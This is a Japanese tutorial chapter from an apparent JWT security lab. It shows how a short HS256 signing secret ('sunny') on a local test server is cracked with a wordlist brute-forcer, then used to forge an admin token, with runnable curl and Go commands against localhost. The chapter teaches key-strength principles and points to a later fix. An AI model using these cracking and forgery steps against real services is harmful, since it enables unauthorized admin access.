# 06. 攻撃2: 署名鍵の総当たり

`stage2`を`Ctrl+C`で止め、`stage3-jwt-weak-secret`を起動する。

```
go run ./cmd/stage3-jwt-weak-secret
```

## 理論

`cmd/stage3-jwt-weak-secret/main.go`を見ると、`AllowAlgNone: false`になっている — 5章の穴は塞がれている。しかし`Secret`は`"sunny"`という短い文字列。

HS256の署名は`HMAC-SHA256(secret, header + "." + payload)`。この計算は誰でも行える(アルゴリズムは公開されている)。**攻撃者が持っていないのは`secret`の値だけ**であり、それが短い・辞書に載っている単語であれば、候補を総当たりして「同じ署名になる値」を探せる。これは実質パスワードクラッキングと同じ理屈で、実際に`jwt_tool`や`hashcat`にJWT用のモードがある。

秘密鍵の強度は「アルゴリズムが安全かどうか」ではなく「鍵空間の広さ」で決まる、という一般的な鍵管理の原則がここでも成り立つ。

## 攻撃

まず正規ユーザーとしてログインし、トークンを1つ手に入れる(=盗聴やXSSでトークンを奪った状況を想定)。

```
curl -c /tmp/cookies.txt -X POST localhost:8080/login \
  -d '{"Username":"bob","Password":"hunter2"}'
CAPTURED=$(grep access_token /tmp/cookies.txt | awk '{print $7}')
```

`tools/bruteforce`にこのトークンとワードリストを渡す。

```
go run ./tools/bruteforce -token "$CAPTURED" -wordlist tools/bruteforce/wordlist.txt
```

`FOUND secret after N attempts: "sunny"`が出る。秘密鍵が割れれば、あとは5章のツールで**正しく署名された**偽トークンを作れる。

```
EXP=$(($(date +%s)+600))
TOKEN=$(go run ./tools/forge \
  -header '{"alg":"HS256","typ":"JWT"}' \
  -payload "{\"sub\":\"mallory\",\"role\":\"admin\",\"exp\":$EXP}" \
  -secret sunny)

curl -i --cookie "access_token=$TOKEN" localhost:8080/admin
```

## 何が起きたか

検証ロジック自体は正しかった。破られたのは運用(鍵の選び方)。JWTの安全性は「署名を検証していること」と「その鍵が十分に強いこと」の両方に依存する。8章では十分な長さのランダム鍵を使う。
